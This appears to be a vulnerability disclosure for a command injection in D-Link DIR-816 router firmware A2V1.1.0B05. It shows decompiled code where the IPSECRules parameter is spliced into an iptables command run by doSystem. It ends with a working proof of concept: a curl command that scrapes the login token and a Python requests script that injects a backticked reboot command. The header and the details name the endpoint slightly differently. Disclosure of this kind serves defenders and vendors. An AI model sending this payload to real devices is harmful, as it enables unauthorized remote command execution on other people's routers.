## DIR-816 Command Injection

### Overview

- Manufacturer's address：http://www.dlink.com.cn/
- Firmware download address ：https://www.dlink.com.cn/techsupport/ProductInfo.aspx?m=DIR-816

### Affected version

D-Link DIR-816  A2V1.1.0B05 was found to contain a command injection in `/goform/getIpsecAction` of the component Web Interface, which allows remote attackers to execute arbitrary commands via shell.

![image-20250310195139787](./img/1.png)

### Vulnerability details

Vulnerability occurs in `/goform/IpsecAction`. Attackers can control `v19` by setting the `IPSECRules`. Then the program extracts the value `v44` from `v19`, splices it into the `iptables` command, and finally hands it over to `dosystem` for execution.

```
int __fastcall sub_422514(int a1)
{
  ......
  v19 = websGetVar(a1, "IPSECRules", 0);
  ......
  result = fclose(v24);
  if ( v19 )
  {
    result = (char)*v19;
    if ( *v19 )
    {
      while ( 1 )
      {
        do
        {
          NthValueSafe = getNthValueSafe(v17++, v19, 59, v39, 800);
          if ( NthValueSafe == -1 )
            return doSystem("chmod 600 /var/psk.txt");
        }
        while ( getNthValueSafe(0, v39, 44, v40, 8) == -1
             || getNthValueSafe(1, v39, 44, v41, 32) == -1
             || getNthValueSafe(2, v39, 44, v42, 32) == -1
             || !sub_4214F0(v42)
             || getNthValueSafe(3, v39, 44, v43, 8) == -1
             || getNthValueSafe(4, v39, 44, v44, 32) == -1
			 ......
             || v40[1] == 48 );
	......
        sprintf(v38, "iptables -t nat -I POSTROUTING 1 -s %s/%d -o %s -d %s/%d -j ACCEPT", v44, v27, v29, v47, v28);
        doSystem(v38);
```

Based on the cause of the vulnerability, attackers can arbitrarily execute the command by setting the `IPSECRules`.

### EXP

First, attackers need to get the token ID.

```
curl http://192.168.0.1/dir_login.asp | grep tokenid
```

Then, run exp.

```
import requests

tokenid = ''

url = 'http://192.168.0.1/goform/IpsecAction'

data = {
    'tokenid': tokenid,
    'IPSECRules': {"protocol": "tcp", "jump to target": "ACCEPT", "input interface": "eth+", "out interface": "eth0", "source": "foo`reboot`bar", "destination": "192.168.1.101"}
}

r = requests.post(url, data)
```
